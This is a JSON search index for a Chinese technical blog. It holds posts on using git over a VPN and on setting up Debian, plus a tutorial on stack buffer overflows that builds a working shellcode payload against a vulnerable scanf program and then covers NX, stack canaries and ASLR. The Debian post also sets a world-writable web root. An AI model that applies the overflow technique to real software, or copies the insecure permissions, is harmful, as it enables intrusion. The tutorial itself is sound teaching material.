

[
  
  
    
    
      {
        "title": "用 VPN 上网时如何使用 Git",
        "excerpt": "使用VPN上网时，如果使用git向远程仓库push代码，可能会出现下面的错误：\n\n$ git push\nssh: connect to host github.com port 22: Connection timed out\nfatal: Could not read from remote repository.\n\n\n",
        "content": "使用VPN上网时，如果使用git向远程仓库push代码，可能会出现下面的错误：\n\n$ git push\nssh: connect to host github.com port 22: Connection timed out\nfatal: Could not read from remote repository.\n\n\n\n\ngoogle到stackoverflow有人问了同样的问题： git push pull times out ，上面给出的原因和解决办法是：“This sort of effect is usually due to the VPN setup routing all your traffic over the VPN. You can work around that by updating your routing tables to route traffic to github back over your Ethernet (I assume) interface rather than over the VPN. For example route add 65.74.177.129 eth0 will route traffic to github over eth0. ” 意思是VPN开启后会将所有数据都通过VPN传递，解决方法是更新路由表使所有发送到（或接收）github的数据都通过原来的网卡来传递。\n\n但按上面给出的命令 route add 65.74.177.129 eth0 设置后问题却仍然没有解决。google到一篇博文 how to do git push under vpn ，提出了需要设置网关，但按此文的方法设置后还是不行。\n\n再google了一下route的使用，搜到这样一篇博文：route详解，上面有一条这样的命令及解释：\n\n# route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.30.1 dev eth1\n# 新增一个路由规则！ 意思是所有以 192.168.*.* 开头的IP的数据的网关是192.168.30.1，\n# 并指定通过eth1进出。\n\n\n按此命令重新设置了一下，问题得以解决。详细步骤如下：\n\n首先用 ping 命令获取 github 的IP地址：\n\n$ ping github.com\nPING github.com (192.30.252.130) 56(84) bytes of data.\n\n\n然后用 route 命令查看一下路由表：\n\n# su\n# route\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\ndefault         *               0.0.0.0         U     1024   0        0 ppp0\n10.0.0.4        *               255.255.255.255 UH    0      0        0 ppp0\n192.168.31.0    *               255.255.255.0   U     0      0        0 eth0\n203.79.187.188  192.168.31.1    255.255.255.255 UGH   0      0        0 eth0\n\n\n可以看到本机有两个连接，一个是VPN连接（也就是ppp0），另一个是以太网卡连接（eth0），若使用无线网卡上网，这里可能是wlan0。另外可以看到一个网关地址 192.168.31.1 。现在把通向 github 的数据指定到 eth0 进出就可以了，命令为：\n\n# route add -net 192.30.252.0 netmask 255.255.255.0 gw 192.168.31.1 dev eth0\n\n\n设置后，可以正常运行 git push 命令了。本篇文章就是按此设置后push到服务器的。^_^\n\n为了开机自动添加此路由规则，打开 /etc/rc.local ，将此命令添加至此文件。\n",
        "url": "/notes/2016/01/05/vpn-howto/"
      },
    
      {
        "title": "Debian 安装和使用",
        "excerpt": "本文介绍 Debian 系统的安装和使用问题。\n\n",
        "content": "本文介绍 Debian 系统的安装和使用问题。\n\n\n\n1、 系统安装\n\n在Vitualbox中安装Debian8（xfce）\n\n见 mralphaville的Blog 。\n\n在Windows下通过U盘安装Debian 7.0 Wheezy\n\n首先通过 http://www.debian.org/distrib/netinst, 在 Tiny CDs, USB sticks, etc. 下面, 找到对应的下载列表, 如x86-64bit, 则选择：http://ftp.nl.debian.org/debian/dists/wheezy/main/installer-amd64/current/images 点击左侧列表里的 hd-media , 下载其中的boot.img.gz, 其他的都不用下。\n\n在windows下, 解开boot.img.gz, 会得到一个img文件。用UltraISO, “启动”-&gt;”写入硬盘镜像”, 选择你的U盘, 写入方式使用USB-HDD, 将这个img 写到U盘上。\n\n成功后, “便捷启动”-&gt; “写入新的硬盘主引导记录MBR” -&gt; USB-HDD。\n\n再下载你需要安装的ISO, 在  http://www.debian.org/distrib/netinst 的 Small CDs 下面选择合适你的系统的ISO文件,下载后,将这个ISO文件复制到你的U盘根目录下。\n\n然后将电脑设置为U盘启动, 就可以看到Debian的安装界面了。\n\n用Grub通过硬盘安装Debian8.4.0\n\n电脑中已经安装了Win7和Debian7双系统，用Grub启动。则可以用Grub从硬盘安装Debian8。\n\n首先下载安装镜像文件debian-8.4.0-amd64-DVD-1.iso，到这里下载。然后下载内核引导程序文件initrd.gz 和vmlinuz ，到这里下载。注意initrd.gz和vmlinuz的版本必须和镜像iso文件的版本一致。\n\n内核引导程序文件（initrd.gz和vmlinuz）可以放在硬盘的任何分区的任意目录，但安装镜像文件debian-8.4.0-amd64-DVD-1.iso必须放在FAT32或EXT文件系统的分区（否则内核引导程序无法识别出镜像文件）。这里为方便起见，假定电脑中D盘为FAT32文件系统，把这三个文件全部放在D盘的根目录下。若硬盘中没有FAT32分区，可以用Win7自带的磁盘管理新建一个FAT32分区。\n\n之后在Debian系统下编辑/boot/grub/grub.cfg，在该文件的最后增加一个启动项：\n\nmenuentry \"Debian DVD 8.4.0\" {\n    linux (hd0,msdos5)/vmlinuz\n    initrd (hd0,msdos5)/initrd.gz\n}\n\n\n这里(hd0,msdos5)代表硬盘的上的msdos5分区，即D盘。分区编号规则为：主分区（C盘）为msdos，第一个逻辑分区（D盘）为msdos5，第二个逻辑分区（E盘）为msdos6…（可以在Grub启动电脑时，按c键进入命令行模式，运行ls命令可以查看所有分区）。\n\ngrub.cfg文件修改完毕保存，重启电脑就可以看到Grub启动菜单中多了一个Debian DVD 8.4.0的启动项了，进入这个启动项就开始安装Debian8了。这里千万要注意不能将Debian安装到镜像iso文件所在的分区上，否则已安装的系统都会挂掉。\n\ngrub.cfg文件中的linux (hd0,msdos5)/vmlinuz和initrd (hd0,msdos5)/initrd.gz命令指定了内核引导程序文件所在的位置，Grub会加载这两个文件中的引导程序，之后引导程序会在硬盘的所有FAT32和EXT分区中搜索安装镜像iso文件，搜索到合法的安装镜像文件后会自动启动iso文件开始安装。\n\n2、 软件安装及配置\n\n配置源：\n\n$ su\n$ nano /etc/apt/sources.list\n... # 只保留以下两行:\ndeb http://ftp.cn.debian.org/debian jessie-backports main\ndeb http://http.debian.net/debian/ jessie main contrib non-free\n$ apt-get update\n\n\n将普通用户加入sudo用户组：\n\n$ apt-get install sudo\n$ chmod +w /etc/sudoers\n$ nano /etc/sudoers\n... # 在 root   ALL=(ALL:ALL) ALL 的后面加入：\nuser    ALL=(ALL:ALL) ALL\n\n\n笔记本电脑安装 wifi ：\n\n$ apt-get update &amp;&amp; apt-get install firmware-iwlwifi\n$ modprobe -r iwlwifi; modprobe iwlwifi\n\n\n中文输入：\n\n$ apt-get install ibus ibus-sunpinyin\n\n\n开发工具：\n\n$ aptitude install build-essential\n$ apt-get install git gdb nasm cmake\n$ apt-get install python-dev\n$ apt-get install python-pip\n$ apt-get install spyder qtcreator\n$ apt-get install openssl libssl-dev\n$ apt-get install mysql-server\n$ git clone https://github.com/mysql/mysql-connector-python.git\n$ cd mysql-connector-python\n$ python setup.py install\n$ apt-get install apache2\n$ apt-get install php5 php5-mysql\n$ chmod 777 /var/www/html\n$ /etc/init.d/apache2 -k restart\n\n\n注意安装 build-essential 时，由于系统自带的 libc 包和源中的版本不一致，可能会导致冲突，必须使用 aptitude 命令安装，安装过程中根据提示对 libc 进行 downgrade ，之后才能正常安装。\n\n安装 nodejs ：\n\n$ apt-get install nodejs npm nodejs-legacy\n\n\nruby和jekyll安装：\n\n$ apt-get install ruby ruby-dev\n$ gem sources --remove https://rubygems.org/\n$ gem sources -a https://ruby.taobao.org/\n$ gem sources -l\n*** CURRENT SOURCES ***\nhttps://ruby.taobao.org\n# 请确保只有 ruby.taobao.org\n$ gem install jekyll\n\n\niceweasel 的 flash player 插件安装：\n\n$ apt-get install flashplugin-nonfree   # 安装\n$ update-flashplugin-nonfree --install  # 更新\n\n\nlantern 安装：\n\n$ apt-get install libappindicator1 libappindicator3-1\n$ dpkg -i google-chrome-stable_current_amd64.deb\n\n\n其中 google-chrome-stable_current_amd64.deb 需要到 lantern 官网下载。\n\nVirtualBox增强功能安装（虚拟机）\n\n$ uname -a\n$ apt-get install linux-headers-3.16.0-4-amd64   # linux-headers的版本根据 uname 命令得到\n$ sh ./VBoxLinuxAdditions.run                    # 先 cd 到 VBoxLinuxAdditions 的光盘目录\n$ usermod -a -G vboxsf yourname                  # 把 yourname 增加到 vboxsf 组中，这样 yourname 用户也能使用共享文件夹了\n\n\n时区和时间设置\n\n设置时区：dpkg-reconfigure tzdata，设置时间：date -s 20160212; date -s 21:24:06。\n\n3、 使用问题\n\nchmod 命令没效果\n这是因为文件在 windows 的 ntfs 分区上，不支持 Ｌinux 下的用户 permissions 等特性，需要将文件拷贝至 ext 分区上。\n\n右键菜单没有 open in terminal 选项\n安装 caja-open-terminal ，sudo apt-get install caja-open-terminal 。\n\n右键菜单中加入项： “在 sumblimetext 中打开当前目录”\n\nDebian 8.4 Mate下，在 ~/.config/caja/scripts 目录下，新建一个名为 Open folder in sublimetext 的文件，将其设置为可执行，并输入以下内容：\n\n#!/bin/bash\n\"~/ProgramFiles/sublime_text_3/sublime_text\" \"${CAJA_SCRIPT_CURRENT_URI:7}\"\n\n\ncaja scripts 中用到的一些 variables ： http://misawascriptkid.blogspot.com/2012/06/caja.html\n\n",
        "url": "/notes/2016/01/10/debiansetup/"
      },
    
      {
        "title": "栈溢出攻击及防护方法简介",
        "excerpt": "如果你学的第一门程序语言是C语言，那么下面这段程序很可能是你写出来的第一个有完整的 “输入—处理—输出” 流程的程序：\n\n#include &lt;stdio.h&gt;\n\nint main() {\n    char name[64];\n    printf(\"What's your name?\");\n    scanf(\"%s\", name);\n    printf(\"Hello, %s!\\n\", name);\n    return 0;\n}\n\n\n",
        "content": "如果你学的第一门程序语言是C语言，那么下面这段程序很可能是你写出来的第一个有完整的 “输入—处理—输出” 流程的程序：\n\n#include &lt;stdio.h&gt;\n\nint main() {\n    char name[64];\n    printf(\"What's your name?\");\n    scanf(\"%s\", name);\n    printf(\"Hello, %s!\\n\", name);\n    return 0;\n}\n\n\n\n\n也许这段小程序给你带来了小小的成就感，也许直到课程结束也没人说这个程序有什么不对，也许你的老师在第一时间就指出这段代码存在栈溢出的漏洞，也许你后来又看到无数的文章指出这个问题同时强调千万要慎用scanf函数，也许你还知道stackoverflow是最好的程序员网站。。。\n\n但可能从来没有人告诉你，什么是栈溢出、栈溢出有什么危害、黑客们可以利用栈溢出来进行什么样的攻击，还有你最想知道的，他们是如何利用栈溢出来实现攻击的，以及如何防护他们的攻击。\n\n本文将一一为你解答这些问题。\n\n1. 准备工具及知识\n\n你需要准备以下工具：\n\n\n  一台64位Linux操作系统的x86计算机（虚拟机也可）\n  gcc编译器、gdb调试器以及nasm汇编器（安装命令：sudo apt-get install build-essential gdb nasm）\n\n\n本文中所有代码均在Debian8.1(amd64)、gcc4.9.2、gdb7.7.1和nasm2.11.05以下运行通过，如果你使用的版本不一致，编译选项和代码中的有关数值可能需要根据实际情况略作修改。\n\n你需要具备以下基础知识：\n\n\n  熟练使用C语言、熟悉gcc编译器以及Linux操作系统\n  熟悉x86汇编，熟练使用mov, push, pop, jmp, call, ret, add, sub这几个常用命令\n  了解函数的调用过程以及调用约定\n\n\n考虑到大部分学校里面使用的x86汇编教材都是32位、windows平台下的，这里简单介绍一下64位Linux平台下的汇编的不同之处（如果你已熟悉Linux下的X86-64汇编，那你可以跳过以下内容，直接阅读第2节）：\n\n第一个不同之处在于寄存器，64位的通用寄存器有rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip，对应32位的eax, ebx, ecx, edx, esi, edi, ebp, esp, eip，另外64位cpu中增加了r8, r9, r10, r11, r12, r13, r14, r15寄存器。\n\n第二个不同之处在于函数的调用约定，x86-32位架构下的函数调用一般通过栈来传递参数，而x86-64位架构下的函数调用的一般用rdi,rsi,rdx,rcx,r8和r9寄存器依次保存前6个整数型参数，浮点型参数保存在寄存器xmm0,xmm1…中，有更多的参数才通过栈来传递参数。\n\n第三个不同之处在于Linux系统特有的系统调用方式，Linux提供了许多很方便的系统调用（如write, read, open, fork, exec等），通过syscall指令调用，由rax指定需要调用的系统调用编号，由rdi,rsi,rdx,r10,r9和r8寄存器传递系统调用需要的参数。Linux(x64)系统调用表详见 linux system call table for x86-64。\n\nLinux(x64)下的Hello world汇编程序如下：\n\n[section .text]\n    global _start\n\n_start:\n    mov rax, 1          ; the system call for write (\"1\" for sys_write)\n    mov rdi, 1          ; file descriptor (\"1\" for standard output)\n    mov rsi, Msg        ; string's address  \n    mov rdx, 12         ; string's length\n    syscall\n\n    mov rax, 0x3c       ; the system call for exit(\"0x3c\" for sys_exit)\n    mov rdi, 0          ; exit code\n    syscall\n\nMsg:\n    DB \"Hello world!\"\n\n\n将以上代码另存为hello-x64.asm，再在终端输入以下命令：\n\n$ nasm -f elf64 hello-x64.asm\n$ ld -s -o hello-x64 hello-x64.o\n$ ./hello-x64\nHello world!\n\n\n将编译生成可执行文件hello-x64，并在终端输出Hello world!。\n\n另外，本文所有汇编都是用intel格式写的，为了使gdb显示intel格式的汇编指令，需在home目录下新建一个.gdbinit的文件，输入以下内容并保存：\n\nset disassembly-flavor intel\nset disassemble-next-line on\ndisplay\n\n\n2. 经典的栈溢出攻击\n\n现在回到最开始的这段程序：\n\n#include &lt;stdio.h&gt;\n\nint main() {\n    char name[64];\n    printf(\"What's your name?\");\n    scanf(\"%s\", name);\n    printf(\"Hello, %s!\\n\", name);\n    return 0;\n}\n\n\n将其另存为victim.c，用gcc编译并运行：\n\n$ gcc victim.c -o victim -zexecstack -g\n$ ./victim \nWhat's your name?Jack\nHello, Jack!\n\n\n上面的编译选项中-g表示输出调试信息，-zexecstack的作用后面再说。先来仔细分析一下源程序，这段程序声明了一个长度为64的字节型数组，然后打印提示信息，再读取用户输入的名字，最后输出Hello和用户输入的名字。代码似乎没什么问题，name数组64个字节应该是够了吧？毕竟没人的姓名会有64个字母，毕竟我们的内存空间也是有限的。但是，往坏处想一想，没人能阻止用户在终端输入100甚至1000个的字符，当那种情况发生时，会发生什么事情？name数组只有64个字节的空间，那些多余的字符呢，会到哪里去？\n\n为了回答这两个问题，需要了解程序运行时name数组是如何保存在内存中的，这是一个局部变量，显然应该保存在栈上，那栈上的布局又是怎样的？让我们来分析一下程序中的汇编指令吧，先将目标程序的汇编码输出到victim.asm文件中，命令如下：\n\nobjdump -d victim -M intel &gt; victim.asm\n\n\n然后打开victim.asm文件，找到其中的main函数的代码：\n\n0000000000400576 &lt;main&gt;:\n  400576:   55                      push   rbp\n  400577:   48 89 e5                mov    rbp,rsp\n  40057a:   48 83 ec 40             sub    rsp,0x40\n  40057e:   bf 44 06 40 00          mov    edi,0x400644\n  400583:   b8 00 00 00 00          mov    eax,0x0\n  400588:   e8 b3 fe ff ff          call   400440 &lt;printf@plt&gt;\n  40058d:   48 8d 45 c0             lea    rax,[rbp-0x40]\n  400591:   48 89 c6                mov    rsi,rax\n  400594:   bf 56 06 40 00          mov    edi,0x400656\n  400599:   b8 00 00 00 00          mov    eax,0x0\n  40059e:   e8 cd fe ff ff          call   400470 &lt;__isoc99_scanf@plt&gt;\n  4005a3:   48 8d 45 c0             lea    rax,[rbp-0x40]\n  4005a7:   48 89 c6                mov    rsi,rax\n  4005aa:   bf 59 06 40 00          mov    edi,0x400659\n  4005af:   b8 00 00 00 00          mov    eax,0x0\n  4005b4:   e8 87 fe ff ff          call   400440 &lt;printf@plt&gt;\n  4005b9:   b8 00 00 00 00          mov    eax,0x0\n  4005be:   c9                      leaved\n  4005bf:   c3                      ret\n\n\n可以看出，main函数的开头和结尾和32位汇编中的函数几乎一样。该函数的开头的push rbp; mov rbp, rsp; sub rsp, 0x40，先保存rbp的数值，再令rbp等于rsp，然后将栈顶指针rsp减小0x40（也就是64），相当于在栈上分配长度为64的空间，main函数中只有name一个局部变量，显然这段空间就是name数组，即name的起始地址为rbp-0x40。再结合函数结尾的leave; ret，同时类比一下32位汇编中的函数栈帧布局，可以画出本程序中main函数的栈帧布局如下（请注意下图是按栈顶在上、栈底在下的方式画的）：\n\n                     Stack\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n name(-0x40)--&gt; +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n  rbp(+0x00)--&gt; +-------------+\n                |   old rbp   |\n     (+0x08)--&gt; +-------------+ &lt;--rsp points here just before `ret`\n                |   ret rip   |\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n                +-------------+\n\n\nrbp即函数的栈帧基指针，在main函数中，name数组保存在rbp-0x40~rbp+0x00之间，rbp+0x00处保存的是上一个函数的rbp数值，rbp+0x08处保存了main函数的返回地址。当main函数执行完leave命令，执行到ret命令时：上一个函数的rbp数值已重新取回至rbp寄存器，栈顶指针rsp已经指向了保存这个返回地址的单元。之后的ret命令会将此地址出栈，然后跳到此地址。\n\n现在可以回答刚才那个问题了，如果用户输入了很多很多字符，会发生什么事情。此时scanf函数会读取第一个空格字符之前的所有字符，然后全部拷贝到name指向的地址处。若用户输入了100个“A”再回车，则栈会是下面这个样子：\n\n                     Stack\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n name(-0x40)--&gt; +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |   AAAAAAAA  |\n  rbp(+0x00)--&gt; +-------------+\n                |   AAAAAAAA  | (should be \"old rbp\")\n     (+0x08)--&gt; +-------------+ &lt;--rsp points here just before `ret`\n                |   AAAAAAAA  | (should be \"ret rip\")\n                +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |     ...     |\n                +-------------+\n\n\n也就是说，上一个函数的rbp数值以及main函数的返回地址全部都被改写了，当执行完ret命令后，cpu将跳到0x4141414141414141(“AAAAAAAA”)地址处，开始执行此地址的指令。\n\n在Linux系统中，0x4141414141414141是一个非法地址，因此程序会出错并退出。但是，如果用户输入了精心挑选的字符后，覆盖在这里的数值是一个合法的地址呢？如果这个地址上恰好保存了用户想要执行的恶意的指令呢？会发生什么事情？\n\n以上就是栈溢出的本质，如果程序在接受用户输入的时候不对下标越界进行检查，直接将其保存到栈上，用户就有可能利用这个漏洞，输入足够多的、精心挑选的字符，改写函数的返回地址（也可以是jmp、call指令的跳转地址），由此获取对cpu的控制，从而执行任何他想执行的动作。\n\n下面介绍最经典的栈溢出攻击方法：将想要执行的指令机器码写到name数组中，然后改写函数返回地址为name的起始地址，这样ret命令执行后将会跳转到name起始地址，开始执行name数组中的机器码。\n\n我们将用这种方法执行一段简单的程序，该程序仅仅是在终端打印“Hack!”然后正常退出。\n\n首先要知道name的起始地址，打开gdb，对victim进行调试，输入gdb -q ./victim，再输入break *main在main函数的开头下一个断点，再输入run命令开始运行，如下：\n\n$ gdb -q ./victim\nReading symbols from ./victim...done.\n(gdb) break *main\nBreakpoint 1 at 0x400576: file victim.c, line 3.\n(gdb) run\nStarting program: /home/hcj/blog/rop/ch02/victim \n\nBreakpoint 1, main () at victim.c:3\n3   int main() {\n=&gt; 0x0000000000400576 &lt;main+0&gt;: 55  push   rbp\n   0x0000000000400577 &lt;main+1&gt;: 48 89 e5    mov    rbp,rsp\n   0x000000000040057a &lt;main+4&gt;: 48 83 ec 40 sub    rsp,0x40\n(gdb) \n\n\n此时程序停留在main函数的第一条指令处，输入p &amp;name[0]和x/gx $rsp分别查看name的起始指针和此时的栈顶指针rsp。\n\n(gdb) p &amp;name[0]\n$1 = 0x7fffffffe100 \"\\001\"\n(gdb) x/gx $rsp\n0x7fffffffe148: 0x00007ffff7a54b45\n(gdb) \n\n\n得到name的起始指针为0x7fffffffe100、此时的栈顶指针rsp为0x7fffffffe148，name到rsp之间一共0x48（也就是72）个字节，这和之前的分析是一致的。\n\n下面来写攻击指令的机器码，首先写出汇编代码：\n\n[section .text]\n        global _start\n\n_start:\n        jmp END\nBEGIN:\n        mov rax, 1\n        mov rdi, 1\n        pop rsi\n        mov rdx, 5\n        syscall\n\n        mov rax, 0x3c\n        mov rdi, 0\n        syscall\nEND:\n        call BEGIN\n        DB \"Hack!\"\n\n\n这段程序和第一节的Hello-x64基本一样，不同之处在于巧妙的利用了call BEGIN和pop rsi获得了字符串“Hack”的地址、并保存到rsi中。将以上代码保存为shell.asm，编译运行一下：\n\n$ nasm -f elf64 shell.asm\n$ ld -s -o shell shell.o\n$ ./shell\nHack!\n\n\n然后用objdump程序提取出机器码：\n\n$ objdump -d shell -M intel\n...\n0000000000400080 &lt;.text&gt;:\n  400080:   eb 1e                   jmp    0x4000a0\n  400082:   b8 01 00 00 00          mov    eax,0x1\n  400087:   bf 01 00 00 00          mov    edi,0x1\n  40008c:   5e                      pop    rsi\n  40008d:   ba 05 00 00 00          mov    edx,0x5\n  400092:   0f 05                   syscall \n  400094:   b8 3c 00 00 00          mov    eax,0x3c\n  400099:   bf 00 00 00 00          mov    edi,0x0\n  40009e:   0f 05                   syscall \n  4000a0:   e8 dd ff ff ff          call   0x400082\n  4000a5:   48 61                   rex.W (bad) \n  4000a7:   63 6b 21                movsxd ebp,DWORD PTR [rbx+0x21]\n\n\n以上机器码一共42个字节，name到ret rip之间一共72个字节，因此还需要补30个字节，最后填上name的起始地址0x7fffffffe100。main函数执行到ret命令时，栈上的数据应该是下面这个样子的（注意最后的name起始地址需要按小端顺序保存）：\n\n                                        Stack\n name(0x7fffffffe100)--&gt; +---------------------------------+ &lt;---+\n                         |  eb 1e           (jmp END)      |     |\n                BEGIN--&gt; +---------------------------------+     |\n                         |  b8 01 00 00 00  (mov eax,0x1)  |     |\n                         +---------------------------------+     |\n                         |  bf 01 00 00 00  (mov edi,0x1)  |     |\n                         +---------------------------------+     |\n                         |  5e              (pop rsi)      |     |\n                         +---------------------------------+     |\n                         |  ba 05 00 00 00  (mov edx,0x5)  |     |\n                         +---------------------------------+     |\n                         |  0f 05           (syscall)      |     |\n                         +---------------------------------+     |\n                         |  b8 3c 00 00 00  (mov eax,0x3c) |     |\n                         +---------------------------------+     |\n                         |  bf 00 00 00 00  (mov edi,0x0)  |     |\n                         +---------------------------------+     |\n                         |  0f 05           (syscall)      |     |\n                   END-&gt; +---------------------------------+     |\n                         |  e8 dd ff ff ff  (call BEGIN)   |     |\n                         +---------------------------------+     |\n                         |  48 61 63 6b 21  (\"Hack!\")      |     |\n     (0x7fffffffe12a)--&gt; +---------------------------------+     |\n                         |  \"\\x00\"*30                      |     |\n  rsp(0x7fffffffe148)--&gt; +---------------------------------+     |\n                         |  00 e1 ff ff ff 7f 00 00        | ----+\n                         +---------------------------------+\n\n\n上图中的栈上的所有字节码就是我们需要输入给scanf函数的字符串，这个字符串一般称为shellcode。由于这段shellcode中有很多无法通过键盘输入的字节码，因此用python将其打印至文件中：\n\n$ python -c 'print \"\\xeb\\x1e\\xb8\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x5e\\xba\\x05\\x00\\x00\\x00\\x0f\\x05\\xb8\\x3c\\x00\\x00\\x00\\xbf\\x00\\x00\\x00\\x00\\x0f\\x05\\xe8\\xdd\\xff\\xff\\xff\\x48\\x61\\x63\\x6b\\x21\" + \"\\x00\"*30 + \"\\x00\\xe1\\xff\\xff\\xff\\x7f\\x00\\x00\"' &gt; shellcode\n\n\n现在可以对victim进行攻击了，不过目前只能在gdb的调试环境下进行攻击。输入gdb -q ./victim，再输入run &lt; shellcode：\n\n$ gdb -q ./victim\nReading symbols from ./victim...done.\n(gdb) run &lt; shellcode\nStarting program: /home/hcj/blog/rop/ch02/victim &lt; shellcode\nWhat's your name?Hello, �\u001e�\u0001!\nHack![Inferior 1 (process 2711) exited normally]\n(gdb) \n\n\n可以看到shellcode已经顺利的被执行，栈溢出攻击成功。\n\n编写shellcode需要注意两个事情：（1） 为了使shellcode被scanf函数全部读取，shellcode中不能含有空格字符（包括空格、回车、Tab键等），也就是说不能含有\\x10、\\x0a、\\x0b、\\x0c、\\x20等这些字节码，否则shellcode将会被截断。如果被攻击的程序使用gets、strcpy这些字符串拷贝函数，那么shellcode中不能含有\\x00。（2） 由于shellcode被加载到栈上的位置不是固定的，因此要求shellcode被加载到任意位置都能执行，也就是说shellcode中要使用相对寻址。\n\n3. 栈溢出攻击的防护\n\n为了防止栈溢出攻击，最直接和最根本的办法当然是写出严谨的代码，剔除任何可能发生栈溢出的代码。这是程序员的责任。而另一方面，当程序代码中确实存在栈溢出漏洞时，操作系统和编译器有一些防护措施来防止栈溢出攻击，主要有以下措施。\n\n（1） 栈不可执行机制\n\n操作系统可以利用cpu的硬件特性，将栈设置为不可执行的，这样上一节所述的将攻击代码放在栈上的攻击方法就无法实施了。\n上一节中gcc victim.c -o victim -zexecstack -g，其中的-zexecstack选项就是告诉操作系统允许本程序的栈可执行。去掉此选项再编译一次试试看：\n\n$ gcc victim.c -o victim_nx -g\n$ gdb -q ./victim_nx\nReading symbols from ./victim_nx...done.\n(gdb) r &lt; shellcode\nStarting program: /home/hcj/blog/rop/ch02/victim_nx &lt; shellcode\nWhat's your name?Hello, �\u001e�\u0001!\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00007fffffffe100 in ?? ()\n=&gt; 0x00007fffffffe100:  eb 1e   jmp    0x7fffffffe120\n(gdb) \n\n\n可以看到当程序跳转到name的起始地址0x00007fffffffe100后，尝试执行此处的指令的时候发生了一个Segmentation fault，之后就中止运行了。\n\n目前来说大部分程序都没有在栈上执行代码的需求，因此将栈设置为不可执行对大部分程序的正常运行都没有任何影响。目前的Linux-x64平台上默认是打开栈不可执行机制的。\n\n（2） 栈保护机制\n\n以gcc编译器为例，编译时若打开栈保护开关，则会在函数的进入和返回的地方增加一些检测指令，这些指令的作用是：当进入函数时，在栈上、ret rip之前保存一个只有操作系统知道的数值；当函数返回时，检查栈上这个地方的数值有没有被改写，若被改写了，则中止程序运行。由于这个数值保存在ret rip的前面，因此若ret rip被改写了，它肯定也会被改写。这个数值被形象的称为金丝雀。\n让我们打开栈保护开关重新编译一下victim.c：\n\n$ gcc victim.c -o victim_fsp -g -fstack-protector\n$ objdump -d victim_fsp -M intel &gt; victim_fsp.asm\n\n\n打开victim_fsp.asm找到main函数，如下：\n\n00000000004005d6 &lt;main&gt;:\n  4005d6:   55                      push   rbp\n  4005d7:   48 89 e5                mov    rbp,rsp\n  4005da:   48 83 ec 50             sub    rsp,0x50\n  \n  4005de:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28\n  4005e5:   00 00 \n  4005e7:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax\n  \n...\n\n  40062d:   48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]\n  400631:   64 48 33 14 25 28 00    xor    rdx,QWORD PTR fs:0x28\n  400638:   00 00 \n  40063a:   74 05                   je     400641 &lt;main+0x6b&gt;\n  40063c:   e8 4f fe ff ff          call   400490 &lt;__stack_chk_fail@plt&gt;\n  400641:   c9                      leave\n  400642:   c3                      ret\n\n\n可以看到函数的开头增加了mov rax,QWORD PTR fs:0x28; mov QWORD PTR [rbp-0x8],rax，函数退出之前增加了mov    rdx,QWORD PTR [rbp-0x8]; xor    rdx,QWORD PTR fs:0x28; je     400641 &lt;main+0x6b&gt;; call   400490 &lt;__stack_chk_fail @ plt&gt;这样的检测代码。\n\n栈保护机制的缺点一个是开销太大，每个函数都要增加5条指令，第二个是只能保护函数的返回地址，无法保护jmp、call指令的跳转地址。在gcc4.9版本中默认是关闭栈保护机制的。\n\n（3） 内存布局随机化机制\n\n内存布局随机化就是将程序的加载位置、堆栈位置以及动态链接库的映射位置随机化，这样攻击者就无法知道程序的运行代码和堆栈上变量的地址。以上一节的攻击方法为例，如果程序的堆栈位置是随机的，那么攻击者就无法知道name数组的起始地址，也就无法将main函数的返回地址改写为shellcode中攻击指令的起始地址从而实施他的攻击了。\n\n内存布局随机化需要操作系统和编译器的密切配合，而全局的随机化是非常难实现的。堆栈位置随机化和动态链接库映射位置随机化的实现的代价比较小，Linux系统一般都是默认开启的。而程序加载位置随机化则要求编译器生成的代码被加载到任意位置都可以正常运行，在Linux系统下，会引起较大的性能开销，因此Linux系统下一般的用户程序都是加载到固定位置运行的。\n\n在Debian8.1和gcc4.9.2环境下实验，代码如下：\n\n#include &lt;stdio.h&gt;\n\nchar g_name[64];\n\nvoid *get_rip()\n{\n    asm(\"\\n\\\n.intel_syntax noprefix\\n\\\n        mov rax, [rbp+8]\\n\\\n.att_syntax\\n\\\n    \");\n}\n\nint main()\n{\n    char name[64];\n    printf(\"Address of `g_name` (Global variable): %x\\n\", g_name);\n    printf(\"Address of `name` (Local variable): %x\\n\", name);\n    printf(\"Address of `main` (User code): %x\\n\", main);\n    printf(\"Value of rip: %x\\n\", get_rip());\n    return 0;\n}\n\n\n将以上代码另存为aslr_test.c，编译并运行几次，如下：\n\n$ gcc -o aslr_test aslr_test.c\n$ ./aslr_test \nAddress of `g_name` (Global variable): 600a80\nAddress of `name` (Local variable): d3933580\nAddress of `main` (User code): 400510\nValue of rip: 400560\n$ ./aslr_test \nAddress of `g_name` (Global variable): 600a80\nAddress of `name` (Local variable): 512cd150\nAddress of `main` (User code): 400510\nValue of rip: 400560\n\n\n可见每次运行，只有局部变量的地址是变化的，全局变量的地址、main函数的地址以及某条指令运行时刻的实际rip数值都是不变，因此程序是被加载到固定位置运行，但堆栈位置是随机的。\n\n动态链接库的映射位置可以用ldd命令查看，如下：\n\n$ ldd aslr_test\n    linux-vdso.so.1 (0x00007ffe1dd9d000)\n    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f26b7e71000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007f26b821a000)\n$ ldd aslr_test\n    linux-vdso.so.1 (0x00007ffc6a771000)\n    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4ec92c0000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007f4ec9669000)\n\n\n可见每次运行，这三个动态链接库映射到进程aslr_test中的位置都是变化的。\n\n4. ROP 